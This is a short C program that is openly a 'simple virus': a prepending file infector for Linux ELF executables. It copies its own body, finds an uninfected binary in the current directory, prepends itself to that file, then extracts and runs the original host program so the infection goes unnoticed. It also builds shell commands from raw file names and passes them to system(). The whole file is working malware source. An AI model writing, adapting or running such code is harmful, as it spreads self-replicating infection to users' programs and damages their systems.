#include<stdio.h>
#include<stdlib.h>
#include<string.h>
int checkinfected(char target[])
{
	char command[500];
	FILE *fp;
	snprintf(command, sizeof(command),"%s%s%s","strings ",target," | grep \"simple virus\" > /tmp/temp001 ;echo $? > /tmp/infected001.txt;chmod 755 /tmp/infected001.txt");
	system(&command[0]);
	fp = fopen("/tmp/infected001.txt", "r");
    	int array[1] = { 0 };
	fscanf(fp, "%d", &array[0]);
	return(array[0]);
}
void saveelves()
{
	system("file * | grep ELF| cut -d ':' -f 1 > /tmp/elves001.txt; chmod 755 /tmp/elves001.txt");
}
int  main(int argc,char* argv[])
{
	saveelves();
	FILE *fp;
	int i;
	char target[500];
	char cmd[500];
	char comd[500];
	char command[500];
	printf("Hello! I am a simple virus!\n");
	snprintf(cmd, sizeof(cmd),"%s%s%s","head -c 9480 ",argv[0]," > /tmp/virus001");
	system(&cmd[0]);
	fp = fopen("/tmp/elves001.txt","r");
	while (fscanf(fp, "%s", target)!=EOF)
	{
		if (checkinfected(target)==1)
		{
			snprintf(command, sizeof(command),"%s%s%s%s%s%s%s%s%s%s","cat /tmp/virus001 ",target," > /tmp/",target,"001;mv /tmp/",target,"001 ",target,"; chmod 755 ",target);
			system(&command[0]);
			break;
		}
		
	}

	if(strcmp(argv[0],"virus") != 0 && strcmp(argv[0] , "./virus") != 0)

	{
		snprintf(comd,sizeof(comd),"%s%s%s","tail -c +9481 ",argv[0], " > /tmp/original001;chmod 755 /tmp/original001");
		system(&comd[0]);
		if(argc==1)	
		{
			system("/tmp/original001");
		}
		else
		{
			char original_functionality[200] = "/tmp/original001 ";
			for (i=2; i<=argc; i++)
			{	
				if(i == argc)
					strcat(original_functionality, argv[i-1]);
				else
					{
						strcat(original_functionality, argv[i-1]);
						strcat(original_functionality, " ");
					}
			}
			system(&original_functionality[0]);			
		}	
	}
	fclose(fp);
	system("rm /tmp/*001*");
}
